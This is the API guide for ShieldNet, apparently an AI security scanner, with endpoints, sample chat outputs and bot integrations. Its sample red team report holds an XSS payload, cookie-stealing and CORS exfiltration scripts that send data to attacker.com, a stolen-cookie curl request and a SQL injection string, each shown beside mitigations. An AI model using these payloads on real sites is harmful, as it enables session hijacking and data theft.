# 🛡️ ShieldNet API Guide

## Quick Reference

ShieldNet provides 4 security actions via ElizaOS. Interact via chat, API, or integrations.

| Action | Trigger | Input | Output |
|--------|---------|-------|--------|
| **SCAN_URL** | URL in message | `https://example.com` | Grade (A-F), findings, remediation |
| **ANALYZE_CODE** | Code block | ````js\ncode\n``` ` | OWASP Top 10 analysis |
| **RED_TEAM** | "red team report" | (uses last scan) | Attack narratives, impact, skill level |
| **SECURITY_REPORT** | "security report" | (uses last scan) | Executive summary, business impact |

## HTTP API

### Base URL

```
http://localhost:3000
```

### Endpoints

#### POST /messages

Send a message to ShieldNet and get a response.

**Request:**
```json
{
  "text": "Scan https://example.com for vulnerabilities",
  "userId": "user123",
  "roomId": "general"
}
```

**Response:**
```json
{
  "success": true,
  "response": {
    "text": "🛡️ ShieldNet Scan Initiated...",
    "timestamp": "2026-03-31T22:00:00Z"
  }
}
```

#### Stream Mode (Server-Sent Events)

For long-running operations (scans, LLM analysis):

```bash
curl -N "http://localhost:3000/stream" \
  -H "Content-Type: application/json" \
  -d '{"text":"Scan https://example.com"}' \
  -H "User-Agent: curl"
```

Response (streaming):
```
data: {"chunk":"🛡️ ShieldNet Scan "}
data: {"chunk":"Initiated\n"}
data: {"chunk":"Target: https://example.com\n"}
...
```

## Chat Examples

### Example 1: URL Scan

```
User: "Scan https://example.com for vulnerabilities"

ShieldNet: 🛡️ ShieldNet Scan Initiated
           Target: https://example.com
           Scanning for vulnerabilities across 26+ attack vectors...
           This may take 30-60 seconds.

           [After scan completes]

           🛡️ ShieldNet Scan Complete
           ━━━━━━━━━━━━━━━━━━━━━━━━━━━
           Target: https://example.com
           Grade: C (65/100)
           Findings: 8 total
           Duration: 45.2s
           ━━━━━━━━━━━━━━━━━━━━━━━━━━━

           🔴 CRITICAL (1)
             • Missing Content-Security-Policy — XSS attacks may succeed
               Fix: Add header: Content-Security-Policy: default-src 'self'

           🟠 HIGH (2)
             • Missing HSTS — Man-in-the-middle/downgrade risk
               Fix: Add header: Strict-Transport-Security: max-age=31536000
             • CORS allows any origin — Authentication bypass possible
               Fix: Set Access-Control-Allow-Origin to specific domains

           🟡 MEDIUM (3)
             • X-Frame-Options missing — Clickjacking possible
             • X-Content-Type-Options missing — MIME sniffing attacks
             • Outdated TLS 1.0 support — Downgrade attacks

           🔵 LOW (2)
             • Server header exposes version information

           💡 Use "red team report" to see attack narratives
              or "security report" for an executive summary.
```

### Example 2: Code Analysis

```
User: Review this code for security issues:
      ```js
      app.get('/api/user/:id', (req, res) => {
        const userId = req.params.id;
        const user = db.query(`SELECT * FROM users WHERE id = ${userId}`);
        res.json(user);
      });
      ```

ShieldNet: 🔍 ShieldNet Code Analysis
           ━━━━━━━━━━━━━━━━━━━━━━━━━━━

           🔴 CRITICAL: SQL Injection (OWASP A03)

           The user input `req.params.id` is directly concatenated
           into the SQL query without parameterization.

           Vulnerable Code:
           ```
           db.query(`SELECT * FROM users WHERE id = ${userId}`)
           ```

           Attack:
           An attacker can inject SQL commands via the URL:
           GET /api/user/1 OR 1=1 --

           This would execute:
           SELECT * FROM users WHERE id = 1 OR 1=1 --

           Result: Attacker dumps the entire users table.

           Impact:
           - Data breach (all user records exposed)
           - Authentication bypass
           - Account takeover

           Fix (Parameterized Query):
           ```js
           db.query('SELECT * FROM users WHERE id = ?', [userId])
           ```

           Or with an ORM:
           ```js
           const user = await User.findById(userId);
           ```

           ───────────────────────────────────

           🟠 HIGH: Missing Input Validation

           No validation that `id` is a valid number.

           Fix:
           ```js
           const userId = parseInt(req.params.id, 10);
           if (!Number.isInteger(userId) || userId < 0) {
             return res.status(400).json({ error: "Invalid ID" });
           }
           db.query('SELECT * FROM users WHERE id = ?', [userId]);
           ```

           ───────────────────────────────────

           🟡 MEDIUM: Missing Authentication Check

           Any user can access any other user's data.

           Fix: Add authentication middleware
           ```js
           app.get('/api/user/:id', authenticateToken, (req, res) => {
             if (req.user.id !== parseInt(req.params.id)) {
               return res.status(403).json({ error: "Forbidden" });
             }
             ...
           });
           ```

           ───────────────────────────────────

           Summary: Fix SQL injection immediately. Implement
                    input validation and access control.
```

### Example 3: Red Team Report

```
User: "Generate a red team report"

ShieldNet: 🔴 ShieldNet Red Team Report
           Target: https://example.com
           Findings Analyzed: 8
           ━━━━━━━━━━━━━━━━━━━━━━━━━━━

           EXECUTIVE THREAT SUMMARY

           The target has multiple critical vulnerabilities that
           allow attackers to bypass security controls. A skilled
           attacker could compromise the entire application within
           1-2 hours. Immediate action required.

           ───────────────────────────────────

           ATTACK CHAIN 1: Session Hijacking via XSS + Missing HSTS

           Skill Level: Intermediate
           Estimated Time: 30 minutes
           Impact: Account Takeover, Data Breach

           Step 1: Identify XSS Entry Point
             The search form does not sanitize user input.
             Test: https://example.com/?search=<img src=x onerror="alert('xss')">

           Step 2: Craft Malicious Payload
             Create a payload that steals session cookies:
             <script>
               fetch('http://attacker.com/steal?cookie=' + document.cookie);
             </script>

           Step 3: Deliver via Phishing
             Send victim a link to the XSS payload.
             When victim clicks, their session cookie is sent to attacker.

           Step 4: Hijack Session
             Use stolen cookie in Authorization header:
             curl -H "Cookie: session=<stolen>" https://example.com/api/admin

           Step 5: Impact
             • Access victim's account
             • Perform actions as victim
             • Steal sensitive data
             • Modify account information

           Mitigation:
           1. Enable HSTS to prevent downgrade attacks
           2. Sanitize all user input (use templating engines)
           3. Set HttpOnly flag on session cookies
           4. Implement CSP headers
           5. Add CSRF tokens to forms

           ───────────────────────────────────

           ATTACK CHAIN 2: Data Exfiltration via CORS Misconfiguration

           Skill Level: Beginner
           Estimated Time: 5 minutes
           Impact: Sensitive Data Exposure

           Step 1: Find CORS Wildcard
             The API accepts Access-Control-Allow-Origin: *

           Step 2: Create Attack Page
             https://attacker.com/evil.html
             ```html
             <script>
               fetch('https://example.com/api/users')
                 .then(r => r.json())
                 .then(data => fetch('http://attacker.com/log?data=' + JSON.stringify(data)));
             </script>
             ```

           Step 3: Trick Victim
             Send victim a link to attacker.com/evil.html

           Step 4: Exfiltrate
             Victim's browser makes requests to example.com API
             (CORS allows it) and sends data to attacker

           Impact:
           • Extract user list, emails, PII
           • Steal API keys from localStorage
           • Perform unauthorized actions

           Mitigation:
           1. Restrict CORS to trusted domains only
           2. Never use Access-Control-Allow-Origin: *
           3. Don't store secrets in localStorage
           4. Use SameSite cookies

           ───────────────────────────────────

           WORST-CASE SCENARIO

           Attacker gains admin access → Defafaces website → Steals all user
           data → Demands ransom → Data sold on dark web

           Estimated Cost: $2.4M (breach + notification + legal)

           ───────────────────────────────────

           RISK MATRIX

           Top Attack Chains by Likelihood × Impact:

           1. XSS + Session Hijacking — Likelihood: HIGH, Impact: CRITICAL
              (Many entry points, easy exploit, full account access)

           2. CORS + Data Exfiltration — Likelihood: HIGH, Impact: HIGH
              (Trivial to exploit, exposes sensitive data)

           3. Missing Auth + Direct Access — Likelihood: MEDIUM, Impact: CRITICAL
              (Requires guessing IDs, but total data breach if successful)

           ───────────────────────────────────

           IMMEDIATE ACTIONS (THIS WEEK)

           1. Deploy CSP + HSTS headers (1 hour)
           2. Fix CORS to specific domains (2 hours)
           3. Sanitize XSS entry points (4 hours)
           4. Add input validation (4 hours)
           5. Implement authentication checks (8 hours)
```

### Example 4: Security Report

```
User: "Give me a security report"

ShieldNet: 📊 ShieldNet Executive Security Report
           Target: https://example.com
           Grade: 🟡 C (65/100)
           Date: 2026-03-31
           ━━━━━━━━━━━━━━━━━━━━━━━━━━━

           Findings Breakdown:
           🔴 Critical: 1 | 🟠 High: 2 | 🟡 Medium: 3 | 🔵 Low: 2 | ⚪ Info: 0

           ───────────────────────────────────

           OVERALL ASSESSMENT

           Your application has significant security gaps that require
           immediate attention. While not catastrophic, these issues
           create substantial risk if left unaddressed. Most issues can
           be fixed within 1-2 weeks.

           ───────────────────────────────────

           BUSINESS IMPACT

           If these vulnerabilities are exploited:

           • Data Breach: Potential exposure of 50,000+ user records
             Cost: $1.2M in GDPR fines + notification
           
           • Account Takeover: Attackers access customer accounts
             Cost: $500K in fraud + customer churn
           
           • Reputational Damage: Security incident becomes public
             Cost: 30-40% customer loss, brand damage
           
           • Regulatory: Failure to disclose breach
             Cost: $5K-$10K per day penalty

           Total Potential Impact: $2-5M

           ───────────────────────────────────

           TOP 3 CRITICAL FINDINGS

           1. Missing Content-Security-Policy Header (🔴 CRITICAL)
              Allows XSS attacks that steal user sessions.
              Affects: All user accounts
              Effort to Fix: 30 minutes
              Impact if Fixed: Eliminates 80% of XSS risk

           2. CORS Wildcard Misconfiguration (🟠 HIGH)
              Allows unauthorized data access from any origin.
              Affects: All API endpoints
              Effort to Fix: 1 hour
              Impact if Fixed: Prevents API abuse

           3. Missing HSTS Header (🟠 HIGH)
              Allows downgrade attacks over unencrypted HTTP.
              Affects: All connections
              Effort to Fix: 30 minutes
              Impact if Fixed: Prevents man-in-the-middle attacks

           ───────────────────────────────────

           REMEDIATION ROADMAP

           Week 1 (Immediate):
             ☐ Deploy CSP header
             ☐ Configure CORS to trusted domains only
             ☐ Enable HSTS
             Time: 2-3 hours
             Impact: HIGH

           Week 2 (Important):
             ☐ Add input validation
             ☐ Implement session security (HttpOnly, SameSite)
             ☐ Update deprecated dependencies
             Time: 8-12 hours
             Impact: HIGH

           Week 3 (Recommended):
             ☐ Implement authentication for all endpoints
             ☐ Add rate limiting
             ☐ Set up security headers scan
             Time: 16-20 hours
             Impact: MEDIUM

           ───────────────────────────────────

           COMPLIANCE IMPLICATIONS

           🔴 GDPR: Risk of non-compliance
              • Data exposed without proper controls
              • Possible violations of Article 32 (security)
              • Potential fines: €7.5M or 10% of revenue

           🟡 PCI-DSS: Not fully compliant
              • Requirement 6.5: Prevent injection attacks
              • Status: FAILING (No input validation)

           🟡 SOC 2: Security logging incomplete
              • Audit requirement: Log all security events
              • Status: PARTIAL (Basic logging only)

           ───────────────────────────────────

           NEXT STEPS

           1. IMMEDIATE (Today)
              Contact your security team.
              Create a Jira ticket for each critical finding.

           2. THIS WEEK
              Implement Week 1 fixes above.
              Schedule a security review meeting.

           3. ONGOING
              Subscribe to ShieldNet for monthly scans.
              Set up automated CI/CD security checks.
              Conduct security training for developers.

           ───────────────────────────────────

           For detailed technical analysis, run "scan <url>" for the full
           vulnerability report or "red team report" for attack narratives.

           🛡️ Report generated by ShieldNet • Hash Security
              Privacy-first security scanning on Nosana
```

## Integration Examples

### Discord Bot

```python
import discord
from discord.ext import commands

client = commands.Bot(command_prefix='!', intents=discord.Intents.default())

@client.command(name='scan')
async def scan(ctx, url: str):
    """Scan a URL with ShieldNet"""
    async with aiohttp.ClientSession() as session:
        async with session.post('http://shieldnet:3000/messages', json={
            'text': f'Scan {url}',
            'userId': str(ctx.author.id),
            'roomId': ctx.channel.id
        }) as resp:
            data = await resp.json()
            await ctx.send(data['response']['text'])

client.run('YOUR_TOKEN')
```

### Slack Integration

```python
from slack_sdk import WebClient
import requests

def handle_message(event):
    text = event['text']
    if 'scan' in text and 'http' in text:
        url = extract_url(text)
        response = requests.post('http://shieldnet:3000/messages', json={
            'text': f'Scan {url}',
            'userId': event['user'],
            'roomId': event['channel']
        })
        slack_client.chat_postMessage(
            channel=event['channel'],
            text=response.json()['response']['text']
        )
```

### Telegram Bot

```python
from telegram import Bot, Update
from telegram.ext import Application, CommandHandler, ContextTypes
import requests

async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    url = context.args[0] if context.args else None
    if not url:
        await context.bot.send_message(chat_id=update.effective_chat.id,
                                       text="Usage: /scan <url>")
        return
    
    response = requests.post('http://shieldnet:3000/messages', json={
        'text': f'Scan {url}',
        'userId': str(update.effective_user.id),
        'roomId': str(update.effective_chat.id)
    })
    await context.bot.send_message(chat_id=update.effective_chat.id,
                                   text=response.json()['response']['text'])

app = Application.builder().token("YOUR_TOKEN").build()
app.add_handler(CommandHandler("scan", scan_command))
app.run_polling()
```

## Response Codes

| Code | Meaning | Example |
|------|---------|---------|
| `200` | Action executed successfully | Scan completed |
| `400` | Bad request (invalid URL, no code) | "URL not found in message" |
| `500` | Server error (LLM failure, API down) | "Scan API returned 503" |
| `504` | Timeout (scan took >2 minutes) | "Scan timed out" |

## Rate Limits

- **Scans**: 1 per minute per user (API bottleneck)
- **LLM Calls**: 10 per minute (token limit)
- **Concurrent**: 3 simultaneous operations max

## Error Handling

**Example Error Response:**

```json
{
  "success": false,
  "error": "Scan failed for https://example.com: Connection timeout",
  "suggestion": "Try again in a moment. If issue persists, the target may be down."
}
```

**Best Practices:**

1. Implement retry logic with exponential backoff
2. Show user a helpful error message, not raw stack trace
3. Log errors for debugging
4. Set timeouts (30-60s for scans)

## Rate Limiting Best Practices

```bash
# Respect rate limits to avoid being blocked

# Bad: Fire 10 scan requests at once
for i in {1..10}; do
  curl http://localhost:3000/messages \
    -d '{"text":"Scan https://example.com"}'
done

# Good: Queue scans with delays
for url in "${urls[@]}"; do
  curl http://localhost:3000/messages \
    -d "{\"text\":\"Scan $url\"}"
  sleep 60  # Wait 1 minute between requests
done
```

## Testing

```bash
# Test SCAN_URL
curl -X POST http://localhost:3000/messages \
  -H "Content-Type: application/json" \
  -d '{"text":"Scan https://example.com","userId":"test"}'

# Test ANALYZE_CODE
curl -X POST http://localhost:3000/messages \
  -H "Content-Type: application/json" \
  -d '{"text":"Review this:\n```js\ndb.query(sql)\n```","userId":"test"}'

# Test RED_TEAM
curl -X POST http://localhost:3000/messages \
  -H "Content-Type: application/json" \
  -d '{"text":"red team report","userId":"test"}'

# Test SECURITY_REPORT
curl -X POST http://localhost:3000/messages \
  -H "Content-Type: application/json" \
  -d '{"text":"security report","userId":"test"}'
```

## Troubleshooting

**Q: My scan keeps timing out**
A: Some targets take 60+ seconds. Increase timeout to 2 minutes.

**Q: "Model not found: Qwen3.5"**
A: Nosana endpoint is down. Check https://status.nosana.io

**Q: LLM responses are too generic**
A: Try a more specific prompt: "Generate a red team report with exploit steps"

**Q: How do I get the raw scan data?**
A: Currently ShieldNet formats findings for readability. Raw data available in logs.

## Support

- **GitHub Issues**: https://github.com/hhhashexe/agent-challenge/issues
- **Email**: security@bughunt.tech
- **Community**: (Discord link coming soon)
